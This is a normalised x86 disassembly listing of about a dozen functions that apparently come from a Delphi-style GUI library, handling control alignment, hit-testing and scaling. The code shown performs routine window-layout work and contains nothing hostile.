sub_42f4b4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c3e4
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x30 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov [ ebp - 0x19 ] 0x0
lea ecx [ ebp - 0x19 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffe8
call sub_44c24c
xor eax eax
mov al [ ebp - 0x19 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffdb
call sub_44c24c
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x51 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42c420
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x54 ] edx
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
lea ecx [ ebp - 0x38 ]
xor edx edx
xor eax eax
call sub_43b77c
lea edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c3a8
sub_42f5e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
push eax
mov ebx [ ebp - 0x4 ]
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_42f628
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42b290
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_42f658
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404988
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax [ edx + 0x150 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42f6a0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x150 ] edx
sub_42f6cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f7f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42b634
mov eax [ ebp - 0x4 ]
push eax
push sub_4311b4
call sub_41a414
mov edx [ ebp - 0x4 ]
mov [ edx + 0x15c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f184
mov edx [ ebp - 0x4 ]
mov [ edx + 0x130 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f388
mov eax [ ebp - 0x4 ]
mov [ eax + 0x160 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x170 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x154 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_44c370
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422cdc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
add eax 0x158
call sub_44cb34
mov eax [ ebp - 0x4 ]
add eax 0x158
call sub_44cae0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x0
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x122 ] dl
mov eax [ ebp - 0x4 ]
mov [ eax + 0x123 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x124 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x128 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f7fa
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
sub_42f820
push ebp
mov ebp esp
add esp 0xfffffff0
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4424d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x144 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x148
call sub_44e3d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x140 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x144 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_429f64
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43056c
mov eax [ ebp - 0x4 ]
call sub_430844
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x9c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x15c ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
dec edx
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_430600
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_430844
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_42b750
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x15c ]
call sub_41a4f4
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_42f92c
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42fa24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_43c7b8
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
mov dx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
call sub_434a04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x170 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
call sub_43c6a8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43c464
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub_42fa30
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_42fa73
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42bb20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa7a
mov eax [ ebp - 0x4 ]
call sub_430294
retn
sub_42fa7a
mov eax [ ebp - 0x4 ]
call sub_42f92c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_431158
pop ecx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42fab8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xa ] 0x0
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x34 ]
setg [ ebp - 0xa ]
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0xa ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
add eax [ edx + 0x3c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x3c ]
cmp eax edx
setle [ ebp - 0xa ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
setg [ ebp - 0xa ]
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
add eax [ edx + 0x38 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x38 ]
cmp eax edx
setle [ ebp - 0xa ]
jmp r-xdata
sub_42fb4c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x51 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ eax + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x38 ]
call sub_43b77c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x5 ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x78 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x78 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x52 ] 0x1
xor eax eax
push ebp
push sub_42fe4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fe54
mov eax [ ebp - 0x4 ]
mov [ eax + 0x52 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x52 ] 0x1
xor eax eax
push ebp
push sub_42fd2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x52 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x7c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x7c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_42fe54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0x18 ]
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_42fe83 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
sub edx [ eax + 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
sub edx [ eax + 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
sub edx [ eax + 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0xc ] edx
sub_42ff14
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x4b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43c264
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
mov dl [ ebp - 0x1 ]
call sub_42fb4c
pop ecx
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x4b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x41 ] 0x4
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ r-xdata ]
mov edx [ ebp - 0x10 ]
and eax [ edx + 0x40 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_43c550
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebp - 0x10 ]
call sub_42fab8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x41 ] 0x4
jne r-xdata
inc [ ebp - 0xc ]
sub_430098
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_430844
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] eax
mov al [ ebp - 0x1 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4307d8
mov dl [ r-xdata ]
cmp dl [ eax + 0x51 ]
jne r-xdata
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4307d8
cmp [ eax + 0x4b ] 0x0
jne r-xdata
sub_4300fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x144 ] 0x0
je r-xdata
push ebp
call sub_430098
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4301c2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_42ff14
pop ecx
push ebp
mov al 0x2
call sub_42ff14
pop ecx
push ebp
mov al 0x3
call sub_42ff14
pop ecx
push ebp
mov al 0x4
call sub_42ff14
pop ecx
push ebp
mov al 0x5
call sub_42ff14
pop ecx
push ebp
xor eax eax
call sub_42ff14
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_44c070
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov bx 0xffef
call sub_44c24c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x148 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_4301e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x120 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_430271
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_430294
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x10
jmp r-xdata
sub_430294
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
dec [ eax + 0x120 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x120 ] 0x0
